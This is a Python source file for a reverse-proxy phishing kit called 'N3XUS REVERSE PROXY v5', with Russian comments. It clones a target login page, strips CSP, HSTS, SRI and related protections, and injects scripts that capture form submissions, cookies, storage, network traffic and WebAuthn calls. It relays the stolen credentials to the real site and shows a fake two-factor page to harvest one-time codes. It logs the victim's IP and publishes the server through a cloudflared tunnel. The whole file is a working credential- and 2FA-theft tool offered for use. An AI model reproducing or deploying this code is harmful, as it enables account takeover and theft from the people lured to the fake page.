# requirements:
#   pip install flask requests beautifulsoup4 playwright
#   playwright install chromium
#
# Запуск: python proxy.py

from flask import Flask, request, make_response
import requests
from bs4 import BeautifulSoup
import urllib.parse
import threading
import subprocess
import os
import re
import json
import uuid
import asyncio
import datetime
import logging

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

target_site = ""
target_base = ""
LOCAL_PAGE = "index_local.html"
LOCAL_2FA_PAGE = "index_2fa.html"
server_started = False

sessions = {}

# ============================================================
# КОНСТАНТЫ
# ============================================================
TOKEN_FIELD_NAMES = (
    "csrfmiddlewaretoken", "_csrf", "_token", "csrftoken",
    "authenticity_token", "__requestverificationtoken",
    "csrf_token", "xsrf-token", "x-xsrf-token", "x-csrf-token",
)
OTP_FIELD_HINTS = ("otp", "code", "token", "2fa", "mfa", "auth", "verify", "totp")
OTP_URL_HINTS = ("2fa", "mfa", "otp", "verify", "auth", "challenge", "code")

# Заголовки, которые точно нельзя пробрасывать обратно
HOP_BY_HOP = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade",
    "content-encoding", "content-length",   # <--- КРИТИЧНО
}

ANTIPHISH_HEADERS = {
    "content-security-policy", "content-security-policy-report-only",
    "x-frame-options", "strict-transport-security",
    "cross-origin-opener-policy", "cross-origin-embedder-policy",
    "cross-origin-resource-policy", "permissions-policy", "feature-policy",
    "expect-ct", "report-to", "nel", "clear-site-data",
    "public-key-pins", "public-key-pins-report-only",
    "x-content-type-options", "referrer-policy",
}

HSTS_PRELOAD_SAMPLE = {
    "google.com", "gmail.com", "youtube.com", "facebook.com",
    "twitter.com", "github.com", "paypal.com", "apple.com",
    "microsoft.com", "live.com", "outlook.com", "amazon.com",
    "cloudflare.com", "mozilla.org", "wikipedia.org",
}

USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/124.0.0.0 Safari/537.36")

SEC_FETCH_HEADERS = {
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
}

SEC_CH_HEADERS = {
    "Sec-CH-UA": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-CH-UA-Platform-Version": '"15.0.0"',
    "Sec-CH-UA-Arch": '"x86"',
    "Sec-CH-UA-Bitness": '"64"',
    "Sec-CH-UA-Full-Version-List":
        '"Chromium";v="124.0.6367.60", "Google Chrome";v="124.0.6367.60"',
}


# ============================================================
# JS-ХУКИ
# ============================================================
HOOK_JS = r"""
(function(){
  const send = (kind, data) => {
    try {
      fetch('/__hook', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({kind, data, url: location.href})
      });
    } catch(e){}
  };

  const _fetch = window.fetch;
  window.fetch = async function(input, init) {
    try {
      const url = (typeof input === 'string') ? input : (input && input.url);
      send('fetch-req', {url, method: (init && init.method) || 'GET',
                         body: init && init.body ? String(init.body).slice(0, 4000) : null});
      const resp = await _fetch.apply(this, arguments);
      try {
        const clone = resp.clone();
        const txt = await clone.text();
        send('fetch-resp', {url, status: resp.status, body: txt.slice(0, 4000)});
      } catch(e){}
      return resp;
    } catch(e){ throw e; }
  };

  const _open = XMLHttpRequest.prototype.open;
  const _send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this.__m = method; this.__u = url;
    return _open.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body) {
    this.addEventListener('load', function(){
      send('xhr', {url: this.__u, method: this.__m,
                   body: body ? String(body).slice(0, 4000) : null,
                   status: this.status,
                   resp: String(this.responseText || '').slice(0, 4000)});
    });
    return _send.apply(this, arguments);
  };

  const _WS = window.WebSocket;
  window.WebSocket = function(url, protocols) {
    const ws = new _WS(url, protocols);
    ws.addEventListener('message', e => send('ws-msg', {url, data: String(e.data).slice(0,2000)}));
    const _s = ws.send.bind(ws);
    ws.send = function(d){ send('ws-send', {url, data: String(d).slice(0,2000)}); return _s(d); };
    return ws;
  };
  window.WebSocket.prototype = _WS.prototype;

  if (window.navigator && navigator.credentials) {
    const _create = navigator.credentials.create.bind(navigator.credentials);
    const _get    = navigator.credentials.get.bind(navigator.credentials);
    navigator.credentials.create = async function(opts){
      send('webauthn-create', {publicKey: opts && opts.publicKey});
      return _create(opts);
    };
    navigator.credentials.get = async function(opts){
      send('webauthn-get', {publicKey: opts && opts.publicKey});
      return _get(opts);
    };
  }

  try {
    const _ls = window.localStorage.setItem.bind(window.localStorage);
    window.localStorage.setItem = function(k,v){ send('ls', {k, v: String(v).slice(0,1000)}); return _ls(k,v); };
    const _ss = window.sessionStorage.setItem.bind(window.sessionStorage);
    window.sessionStorage.setItem = function(k,v){ send('ss', {k, v: String(v).slice(0,1000)}); return _ss(k,v); };
  } catch(e){}

  try {
    const _set = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    if (_set && _set.set) {
      Object.defineProperty(document, 'cookie', {
        set(v){ send('cookie-set', {v: String(v).slice(0,1000)}); return _set.set.call(document, v); },
        get(){ return _set.get.call(document); }
      });
    }
  } catch(e){}
})();
"""


TROLL_SCRIPT_CODE = """
(function() {
    const sources = ["https://www.myinstants.com/media/sounds/sound-baord-spongebob.mp3"];
    let music = null, current = 0;
    function playMusic() {
        if (music) { music.pause(); music = null; }
        music = new Audio(sources[current]);
        music.volume = 0.85; music.loop = true;
        music.play().catch(() => {
            current = (current + 1) % sources.length;
            if (current !== 0) playMusic();
        });
    }
    playMusic();
    document.addEventListener("click", () => {
        if (music && music.paused) music.play().catch(() => {});
    }, { once: true });
    const style = document.createElement("style");
    style.innerHTML = `
        @keyframes rgb { 0%{filter:hue-rotate(0deg)} 100%{filter:hue-rotate(360deg)} }
        @keyframes float {
            0%{transform:translateY(0) rotate(-5deg)}
            50%{transform:translateY(-35px) rotate(8deg)}
            100%{transform:translateY(0) rotate(-5deg)}
        }
        body { animation: rgb 3.5s linear infinite !important; }
        .sb-meme {
            position: fixed; z-index: 999999; pointer-events: none;
            font-family: 'Comic Sans MS', cursive; font-weight: bold;
            font-size: 26px; color: #fff;
            text-shadow: 0 0 12px #ff00ff, 0 0 25px #00ffff, 0 0 40px #ffff00;
            animation: float 2.2s ease-in-out infinite, rgb 2.5s linear infinite;
            user-select: none;
        }
    `;
    document.head.appendChild(style);
    const phrases = ["ЭТО ТРОЛЛЬ", "ХА-ХА-ХА", "ТЫ ПОПАЛСЯ", "N3XUS", "2FA BYPASS"];
    for (let i = 0; i < 14; i++) {
        const el = document.createElement("div");
        el.className = "sb-meme";
        el.innerText = phrases[Math.floor(Math.random() * phrases.length)];
        el.style.left = Math.random() * 88 + "vw";
        el.style.top = Math.random() * 78 + "vh";
        el.style.animationDelay = (Math.random() * 2.5) + "s";
        el.style.fontSize = (20 + Math.random() * 18) + "px";
        document.body.appendChild(el);
    }
    let shake = 0;
    setInterval(() => {
        shake = shake === 0 ? 4 : 0;
        document.body.style.transform = `translate(${shake}px, ${-shake}px)`;
    }, 70);
})();
"""


# ============================================================
# УТИЛИТЫ
# ============================================================
def save_line(tag, text):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("captured.txt", "a", encoding="utf-8") as f:
        f.write(f"[{ts}] [{tag}] {text}\n")


def is_hsts_preloaded(host):
    host = (host or "").lower().lstrip("www.")
    for d in HSTS_PRELOAD_SAMPLE:
        if host == d or host.endswith("." + d):
            return True
    return False


def detect_antiphish(url, resp):
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or ""
    found = {
        "host": host,
        "hsts_preload": is_hsts_preloaded(host),
        "hsts_header": bool(resp.headers.get("Strict-Transport-Security")),
        "csp": bool(resp.headers.get("Content-Security-Policy")),
        "xfo": bool(resp.headers.get("X-Frame-Options")),
        "coop": bool(resp.headers.get("Cross-Origin-Opener-Policy")),
        "coep": bool(resp.headers.get("Cross-Origin-Embedder-Policy")),
        "corp": bool(resp.headers.get("Cross-Origin-Resource-Policy")),
        "expect_ct": bool(resp.headers.get("Expect-CT")),
        "report_to": bool(resp.headers.get("Report-To")),
        "nel": bool(resp.headers.get("NEL")),
        "sri_scripts": 0,
        "referrer_policy": resp.headers.get("Referrer-Policy", ""),
    }
    try:
        soup = BeautifulSoup(resp.text, "html.parser")
        found["sri_scripts"] = sum(1 for s in soup.find_all("script") if s.get("integrity"))
        found["origin_trial"] = bool(soup.find("meta", attrs={"http-equiv": "origin-trial"}))
    except Exception:
        pass
    return found


def log_antiphish(info, who):
    save_line("ANTIPHISH", f"{who} | {json.dumps(info, ensure_ascii=False)}")
    if info.get("hsts_preload"):
        print(f"[!] {info['host']} в HSTS preload — MITM невозможен без валидного сертификата.")
    if info.get("sri_scripts"):
        print(f"[*] SRI на {info['sri_scripts']} скриптах — вырезан.")
    if info.get("csp"):
        print("[*] CSP присутствует — вырезан из ответа.")


def extract_tokens(html):
    tokens = {}
    try:
        soup = BeautifulSoup(html, "html.parser")
        for inp in soup.find_all("input"):
            name = (inp.get("name") or "").lower()
            if name in TOKEN_FIELD_NAMES:
                tokens[inp.get("name")] = inp.get("value", "")
        for m in soup.find_all("meta"):
            n = (m.get("name") or "").lower()
            if n in ("csrf-token", "csrf-param"):
                tokens[n] = m.get("content", "")
    except Exception:
        pass
    return tokens


def is_2fa_page(url="", html=""):
    low_url = (url or "").lower()
    if any(h in low_url for h in OTP_URL_HINTS):
        return True
    low_html = (html or "").lower()
    for hint in OTP_FIELD_HINTS:
        if re.search(r'name=["\'][^"\']*%s[^"\']*["\']' % hint, low_html):
            return True
        if re.search(r'id=["\'][^"\']*%s[^"\']*["\']' % hint, low_html):
            return True
    return False


def build_upstream_headers(referer=None):
    h = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                  "image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "identity",   # <--- КРИТИЧНО: без сжатия
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "DNT": "1",
    }
    h.update(SEC_FETCH_HEADERS)
    h.update(SEC_CH_HEADERS)
    if referer:
        h["Referer"] = referer
        h["Origin"] = referer.rsplit("/", 1)[0]
    return h


def strip_response_headers(headers_dict):
    out = {}
    for k, v in headers_dict.items():
        lk = k.lower()
        if lk in HOP_BY_HOP or lk in ANTIPHISH_HEADERS:
            continue
        out[k] = v
    return out


def strip_antiphish_from_html(soup):
    for s in soup.find_all(["script", "link"]):
        for attr in ("integrity", "crossorigin"):
            if s.get(attr):
                del s[attr]
    for m in soup.find_all("meta"):
        he = (m.get("http-equiv") or "").lower()
        if he in ("content-security-policy", "origin-trial", "expect-ct"):
            m.decompose()


def proxy_url(raw):
    """Оборачивает абсолютный/относительный URL в /proxy?url=..."""
    if not raw:
        return raw
    if raw.startswith(("data:", "javascript:", "#", "mailto:", "tel:", "blob:")):
        return raw
    if raw.startswith("/proxy"):
        return raw
    if raw.startswith("http://") or raw.startswith("https://"):
        return "/proxy?url=" + urllib.parse.quote(raw, safe="")
    if raw.startswith("//"):
        return "/proxy?url=" + urllib.parse.quote("https:" + raw, safe="")
    if raw.startswith("/"):
        return "/proxy?url=" + urllib.parse.quote(target_base + raw, safe="")
    return raw


def rewrite_urls_to_proxy(soup):
    for tag in soup.find_all(['a', 'link', 'script', 'img', 'form', 'source', 'iframe']):
        if tag.name in ('a', 'link'):
            attr = 'href'
        elif tag.name == 'form':
            attr = 'action'
        else:
            attr = 'src'
        val = tag.get(attr)
        if val:
            tag[attr] = proxy_url(val)
        if tag.name == 'source' and tag.get('srcset'):
            tag['srcset'] = ', '.join(
                proxy_url(p.strip().split(' ')[0]) + ' ' + ' '.join(p.strip().split(' ')[1:])
                for p in tag['srcset'].split(',')
            )

    # Внутри инлайн-JS: переписываем абсолютные ссылки на target
    for s in soup.find_all("script"):
        if s.string and target_base in s.string:
            s.string = s.string.replace(target_base, "/proxy?url=" + target_base)


def inject_scripts(soup, troll_mode=False):
    hook = soup.new_tag("script")
    hook.string = HOOK_JS
    (soup.body or soup).append(hook)

    sniffer = soup.new_tag("script")
    sniffer.string = """
    document.addEventListener("submit", function(e) {
        let formData = new FormData(e.target);
        let data = {};
        formData.forEach((value, key) => { data[key] = value; });
        fetch('/__hook', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({kind: 'form-submit', data, url: location.href})
        });
    }, true);
    """
    (soup.body or soup).append(sniffer)

    if troll_mode:
        t = soup.new_tag("script"); t.string = TROLL_SCRIPT_CODE
        (soup.body or soup).append(t)


def make_2fa_page(fields, troll_mode=False):
    inputs = "\n".join(
        f'<label>{f}<input type="text" name="{f}" required></label><br><br>'
        for f in fields
    )
    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Verification</title>
<style>body{{font-family:Arial;background:#f4f4f4;display:flex;align-items:center;
justify-content:center;height:100vh;margin:0}}.card{{background:#fff;padding:30px 40px;
border-radius:10px;box-shadow:0 4px 18px rgba(0,0,0,.15);text-align:center}}
button{{padding:10px 25px;background:#4b6bff;color:#fff;border:none;border-radius:6px;cursor:pointer}}</style>
</head><body><form method="POST" action="/" class="card">
<h2>Two-factor authentication</h2>
<p>Enter the code from your authenticator app</p>
{inputs}<button type="submit">Verify</button></form>
{"<script>"+TROLL_SCRIPT_CODE+"</script>" if troll_mode else ""}
</body></html>"""
    return html


# ============================================================
# PLAYWRIGHT
# ============================================================
async def _render(url, cookies=None):
    from playwright.async_api import async_playwright
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--disable-blink-features=AutomationControlled"]
        )
        ctx = await browser.new_context(
            user_agent=USER_AGENT,
            viewport={"width": 1366, "height": 768},
            locale="en-US",
        )
        if cookies:
            await ctx.add_cookies(cookies)
        page = await ctx.new_page()
        await page.add_init_script(HOOK_JS)
        try:
            await page.goto(url, wait_until="networkidle", timeout=30000)
        except Exception:
            pass
        html = await page.content()
        ck = await ctx.cookies()
        await browser.close()
        return html, ck


def render_sync(url, cookies=None):
    return asyncio.run(_render(url, cookies))


def requests_cookies_to_pw(rs):
    out = []
    host = urllib.parse.urlparse(target_base).hostname or ""
    for c in rs.cookies:
        out.append({
            "name": c.name, "value": c.value,
            "domain": c.domain or host,
            "path": c.path or "/",
            "secure": bool(c.secure),
            "httpOnly": False,
            "sameSite": "Lax",
        })
    return out


# ============================================================
# COOKIE
# ============================================================
def normalize_cookie_for_proxy(cookie, is_https):
    name = cookie.name
    secure = bool(cookie.secure) or is_https
    path = cookie.path or "/"
    if name.startswith("__Host-"):
        return {"name": name, "value": cookie.value,
                "secure": True, "path": "/", "httponly": False,
                "samesite": "Lax", "domain": None}
    if name.startswith("__Secure-"):
        return {"name": name, "value": cookie.value,
                "secure": True, "path": path, "httponly": False,
                "samesite": "Lax"}
    return {"name": name, "value": cookie.value,
            "secure": secure, "path": path, "httponly": False,
            "samesite": "Lax"}


def attach_upstream_cookies(out_resp, rs, is_https):
    for c in rs.cookies:
        try:
            cfg = normalize_cookie_for_proxy(c, is_https)
            kwargs = {"path": cfg["path"], "secure": cfg["secure"],
                      "httponly": cfg["httponly"], "samesite": cfg["samesite"]}
            if cfg.get("domain"):
                kwargs["domain"] = cfg["domain"]
            out_resp.set_cookie(cfg["name"], cfg["value"], **kwargs)
        except Exception:
            pass
    return out_resp


def merge_client_cookies(rs):
    for k, v in request.cookies.items():
        if k == "sid":
            continue
        rs.cookies.set(k, v)


# ============================================================
# СЕССИИ
# ============================================================
def get_session():
    sid = request.cookies.get("sid") or str(uuid.uuid4())
    if sid not in sessions:
        rs = requests.Session()
        rs.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "en-US,en;q=0.9",
        })
        sessions[sid] = {"rs": rs, "stage": "login", "tokens": {}}
    sess = sessions[sid]
    merge_client_cookies(sess["rs"])
    return sid, sess


def finalize(body, sess, sid, status=200, content_type="text/html"):
    r = make_response(body, status)
    r.headers["Content-Type"] = content_type
    # чистим возможные leftovers
    for h in ("Content-Encoding", "Content-Length", "Transfer-Encoding"):
        if h in r.headers:
            del r.headers[h]
    r.set_cookie("sid", sid, max_age=86400, samesite="Lax")
    attach_upstream_cookies(r, sess["rs"], request.is_secure)
    return r


# ============================================================
# МИРАЖ
# ============================================================
def download_mirror(url, troll_mode=False):
    global target_site, target_base
    target_site = url
    p = urllib.parse.urlparse(url)
    target_base = f"{p.scheme}://{p.netloc}"

    try:
        print("\n[*] Creating a local copy...")
        resp = requests.get(url, headers=build_upstream_headers(), timeout=15)
        resp.encoding = resp.apparent_encoding or "utf-8"

        ap_info = detect_antiphish(url, resp)
        log_antiphish(ap_info, "server")

        html = resp.text
        raw_soup = BeautifulSoup(html, "html.parser")
        text_len = len(raw_soup.get_text(strip=True))
        script_cnt = len(raw_soup.find_all("script"))
        if script_cnt > 3 and text_len < 200:
            print("[*] SPA detected — rendering with Playwright...")
            try:
                html, _ = render_sync(url)
            except Exception as e:
                print(f"[!] Playwright failed: {e}, using raw HTML")

        soup = BeautifulSoup(html, "html.parser")
        strip_antiphish_from_html(soup)
        rewrite_urls_to_proxy(soup)

        for form in soup.find_all("form"):
            form["action"] = "/"
            form["method"] = "POST"

        inject_scripts(soup, troll_mode)

        with open(LOCAL_PAGE, "w", encoding="utf-8") as f:
            f.write(str(soup))

        tokens = extract_tokens(html)
        if tokens:
            print(f"[+] Tokens: {list(tokens.keys())}")
            save_line("TOKENS", json.dumps(tokens, ensure_ascii=False)[:2000])

        otp = [i.get("name") for i in soup.find_all("input")
               if any(h in (i.get("name") or "").lower() for h in OTP_FIELD_HINTS)]
        if otp:
            print(f"[+] 2FA form detected: {otp}")
        with open(LOCAL_2FA_PAGE, "w", encoding="utf-8") as f:
            f.write(make_2fa_page(otp or ["code"], troll_mode))

        print("[+] Local copy created.")
    except Exception as e:
        print(f"[!] Error: {e}")


# ============================================================
# /__hook
# ============================================================
@app.route("/__hook", methods=["POST"])
def hook_endpoint():
    data = request.get_json(silent=True) or {}
    kind = data.get("kind", "?")
    payload = data.get("data")
    url = data.get("url", "")
    tag_map = {
        "form-submit": "FORM",
        "fetch-req": "REQ", "xhr": "REQ",
        "fetch-resp": "RESP",
        "ws-msg": "WS", "ws-send": "WS",
        "webauthn-create": "WEBAUTHN", "webauthn-get": "WEBAUTHN",
        "ls": "LS", "ss": "SS",
        "cookie-set": "COOKIE",
    }
    tag = tag_map.get(kind, "HOOK")
    save_line(tag, f"{url} | {json.dumps(payload, ensure_ascii=False)[:3000]}")
    return "", 204


# ============================================================
# /proxy
# ============================================================
@app.route("/proxy")
def proxy_endpoint():
    url = request.args.get("url", "")
    if not url:
        return "no url", 400
    if "/proxy" in url:
        return "recursion", 400

    sid, sess = get_session()
    try:
        upstream = sess["rs"].get(
            url,
            headers=build_upstream_headers(referer=target_site),
            timeout=20, allow_redirects=True,
        )
        ctype = upstream.headers.get("Content-Type", "application/octet-stream")

        if "text/html" in ctype:
            upstream.encoding = upstream.apparent_encoding or "utf-8"
            soup = BeautifulSoup(upstream.text, "html.parser")
            strip_antiphish_from_html(soup)
            rewrite_urls_to_proxy(soup)
            inject_scripts(soup)
            body = str(soup).encode("utf-8")
            ctype = "text/html; charset=utf-8"
        elif "text/css" in ctype:
            upstream.encoding = upstream.apparent_encoding or "utf-8"
            css = upstream.text
            # заменить абсолютные URL на /proxy
            css = re.sub(
                r'url\((["\']?)(https?://[^)"\']+)\1\)',
                lambda m: f'url("/proxy?url={urllib.parse.quote(m.group(2), safe="")}")',
                css,
            )
            body = css.encode("utf-8")
        else:
            # JS, картинки, шрифты — как есть
            body = upstream.content

        r = make_response(body, upstream.status_code)
        for k, v in strip_response_headers(upstream.headers).items():
            r.headers[k] = v
        r.headers["Content-Type"] = ctype
        # жёстко убираем encoding — body уже распакован
        for h in ("Content-Encoding", "Content-Length", "Transfer-Encoding"):
            if h in r.headers:
                del r.headers[h]
        r.set_cookie("sid", sid, max_age=86400, samesite="Lax")
        attach_upstream_cookies(r, sess["rs"], request.is_secure)
        return r
    except Exception as e:
        return f"proxy error: {e}", 502


# ============================================================
# /
# ============================================================
@app.route("/", methods=["GET", "POST"])
def mirror_server():
    client_ip = request.headers.get("CF-Connecting-IP", request.remote_addr)
    xff = request.headers.get("X-Forwarded-For", "")
    via = request.headers.get("Via", "")
    is_vpn = bool(via or (xff and "," in xff))
    vpn_text = "YES" if is_vpn else "no"
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    sid, sess = get_session()

    if request.method == "POST":
        form_data = {}
        if request.is_json:
            form_data = request.get_json(silent=True) or {}
        if not form_data:
            form_data = request.form.to_dict()
        if not form_data:
            form_data = request.values.to_dict()
        if not form_data and request.data:
            form_data = {"raw_data": request.data.decode("utf-8", "ignore")}

        for k, v in sess["tokens"].items():
            form_data.setdefault(k, v)

        is_otp = (any(any(h in (k or "").lower() for h in OTP_FIELD_HINTS)
                      for k in form_data.keys())
                  or sess["stage"] == "2fa")
        step_tag = "2FA" if is_otp else "LOGIN"

        if target_site:
            try:
                up = sess["rs"].post(
                    target_site, data=form_data,
                    headers=build_upstream_headers(referer=target_site),
                    timeout=20, allow_redirects=True,
                )
                ap = detect_antiphish(target_site, up)
                log_antiphish(ap, client_ip)
                tokens = extract_tokens(up.text)
                if tokens:
                    sess["tokens"].update(tokens)
            except Exception as e:
                print(f"[!] upstream POST failed: {e}")

        print("\n" + "=" * 50)
        print(f" [!] DATA [{step_tag}] [{now}]")
        print(f" 🌐 IP: {client_ip} | VPN: {vpn_text}")
        for k, v in form_data.items():
            print(f"    -> {k}: {v}")
        if sess["tokens"]:
            print(f" 🎫 Tokens: {list(sess['tokens'].keys())}")
        print("=" * 50 + "\n")

        save_line(step_tag,
                  f"IP={client_ip} | VPN={vpn_text} | "
                  f"data={json.dumps(form_data, ensure_ascii=False)[:3000]} | "
                  f"tokens={list(sess['tokens'].keys())}")

        if is_otp:
            sess["stage"] = "login"
            return finalize(
                "<script>alert('Invalid code. Try again.');location.href='/';</script>",
                sess, sid)

        sess["stage"] = "2fa"
        if os.path.exists(LOCAL_2FA_PAGE):
            with open(LOCAL_2FA_PAGE, encoding="utf-8") as f:
                return finalize(f.read(), sess, sid)
        return finalize(make_2fa_page(["code"]), sess, sid)

    # GET
    print(f"[{now}] Visit [{sess['stage']}] | {client_ip} | VPN: {vpn_text}")

    if sess["rs"].cookies:
        ck = "; ".join(f"{c.name}={c.value[:40]}" for c in sess["rs"].cookies)
        save_line("COOKIES", f"IP={client_ip} | {ck[:2000]}")

    if sess["stage"] == "2fa" and os.path.exists(LOCAL_2FA_PAGE):
        with open(LOCAL_2FA_PAGE, encoding="utf-8") as f:
            return finalize(f.read(), sess, sid)

    if target_site:
        try:
            up = sess["rs"].get(
                target_site,
                headers=build_upstream_headers(),
                timeout=20, allow_redirects=True,
            )
            ap = detect_antiphish(target_site, up)
            log_antiphish(ap, client_ip)
            up.encoding = up.apparent_encoding or "utf-8"

            soup = BeautifulSoup(up.text, "html.parser")
            strip_antiphish_from_html(soup)
            rewrite_urls_to_proxy(soup)
            inject_scripts(soup)

            tokens = extract_tokens(up.text)
            if tokens:
                sess["tokens"].update(tokens)

            r = make_response(str(soup).encode("utf-8"))
            for k, v in strip_response_headers(up.headers).items():
                r.headers[k] = v
            r.headers["Content-Type"] = "text/html; charset=utf-8"
            for h in ("Content-Encoding", "Content-Length", "Transfer-Encoding"):
                if h in r.headers:
                    del r.headers[h]
            r.set_cookie("sid", sid, max_age=86400, samesite="Lax")
            attach_upstream_cookies(r, sess["rs"], request.is_secure)
            return r
        except Exception as e:
            print(f"[!] GET failed: {e}, using cache")

    if os.path.exists(LOCAL_PAGE):
        with open(LOCAL_PAGE, encoding="utf-8") as f:
            return finalize(f.read(), sess, sid)
    return "Target is not configured.", 404


# ============================================================
# СЕРВЕР
# ============================================================
def run_flask():
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False, threaded=True)


def run_tunnel():
    subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:5000"])


# ============================================================
# CLI
# ============================================================
if __name__ == "__main__":
    while True:
        os.system("clear")
        print("=" * 50)
        print("           N3XUS REVERSE PROXY  v5")
        print("=" * 50)
        print(" [1] Enter link")
        print(" [2] Enter link + Troll Edition")
        print(" [3] View captured data")
        print(" [4] Active sessions")
        print(" [5] Clear session")
        print(" [6] Antiphish status")
        print(" [7] Exit")
        print("=" * 50)

        choice = input("Select: ").strip()

        if choice in ["1", "2"]:
            troll = (choice == "2")
            target_site = input("Target URL: ").strip()
            if target_site:
                download_mirror(target_site, troll_mode=troll)
                if not server_started:
                    threading.Thread(target=run_flask, daemon=True).start()
                    threading.Thread(target=run_tunnel, daemon=True).start()
                    server_started = True
                    print("[+] Server + tunnel started.")
                else:
                    print("[+] Mirror updated.")
                input("Enter...")
            else:
                input("[!] Empty URL.")

        elif choice == "3":
            if os.path.exists("captured.txt"):
                with open("captured.txt", encoding="utf-8") as f:
                    print(f.read())
            else:
                print("No data.")
            input("Enter...")

        elif choice == "4":
            if not sessions:
                print("No active sessions.")
            for sid, s in sessions.items():
                print(f"\n--- {sid[:8]}... stage={s['stage']} ---")
                print("cookies:", [(c.name, c.value[:30]) for c in s["rs"].cookies])
                print("tokens :", list(s["tokens"].keys()))
            input("Enter...")

        elif choice == "5":
            sid = input("sid prefix (empty = all): ").strip()
            if not sid:
                sessions.clear()
                print("All cleared.")
            else:
                for k in list(sessions.keys()):
                    if k.startswith(sid):
                        sessions.pop(k, None)
                        print(f"Removed {k}")
            input("Enter...")

        elif choice == "6":
            print("\n--- ANTIPHISH STATUS ---")
            if target_site:
                host = urllib.parse.urlparse(target_site).hostname or ""
                print(f"target       : {target_site}")
                print(f"hsts_preload : {is_hsts_preloaded(host)}")
                try:
                    r = requests.get(target_site, headers=build_upstream_headers(),
                                     timeout=10, allow_redirects=True)
                    info = detect_antiphish(target_site, r)
                    print(json.dumps(info, indent=2, ensure_ascii=False))
                except Exception as e:
                    print(f"check error: {e}")
            else:
                print("Target not set.")
            input("Enter...")

        elif choice == "7":
            os._exit(0)
